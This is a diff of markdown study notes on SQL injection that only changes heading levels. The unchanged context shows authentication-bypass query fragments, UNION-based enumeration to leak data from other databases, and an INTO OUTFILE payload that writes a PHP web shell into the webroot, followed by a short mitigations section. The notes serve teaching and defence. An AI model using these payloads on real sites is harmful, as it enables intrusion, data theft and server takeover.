@@ -1,6 +1,6 @@
 If websites rely on user input to create SQL queries to their databases, we can inject our input to access the database, modify its contents, and even install ourselves onto the backend. 
 
-# Authentication Bypass
+## Authentication Bypass
 
 Imagine we have a login screen that performs this SQL query whenever we login, returning true if the user should be allowed to login:
 ```sql
@@ -18,7 +18,7 @@ SELECT * FROM users WHERE username = '$user' OR TRUE;
 Clearly, we've bypassed authentication here too. 
 
 
-# Data Leakage
+## Data Leakage
 
 So we can terminate SQL queries early. Big deal. I want to read what's inside the tables those queries are accessing. Better yet, I want to read what's inside other tables, or even other databases on the SQL server. 
 
@@ -31,7 +31,7 @@ First, we need to figure out how many columns the table accessed by the query we
 
 Now we can enumerate. Once we know what columns in the table are displayed, we can replace those numbers with things we care about, like `@@version`,  `user()`, or `database()`.
 
-## Cross-database leaking
+### Cross-database leaking
 
 But wait - what if I want to access entries in other tables, or other databases? What if I don't know how many columns those tables have, or what the database/table names are? No worries, we can use enumeration to eventually get us to data leakage. 
 
@@ -58,7 +58,7 @@ Then, we can get the data we want through
 UNION select whoCares1, goodStuff, whoCares2 from databasename.tablename
 ```
 
-# Database Escape
+## Database Escape
 
 We can also use SQL injections to break out of our database, reading and writing files on the server's system. 
 
@@ -81,7 +81,7 @@ union select "<really who cares but should be empty>",'<?php system($_REQUEST[0]
 ```
 
 If we aren't able to access the webroot directly, we can install it in the directory we're using to access the webpage we're injecting through. For example, if we're injecting through `website.com/dashboard/inject.php`, our outfile would be `/var/www/html/dashboard/inject.php` 
-# Mitigations
+## Mitigations
 
 The usual: sanitation (primarily through escaping) and validation, and a new one: parameterized queries. Here, the idea is to pre-build a SQL statement, separating out user input as parameters to the query's invocation rather than inserting them directly into the statement itself. 
 
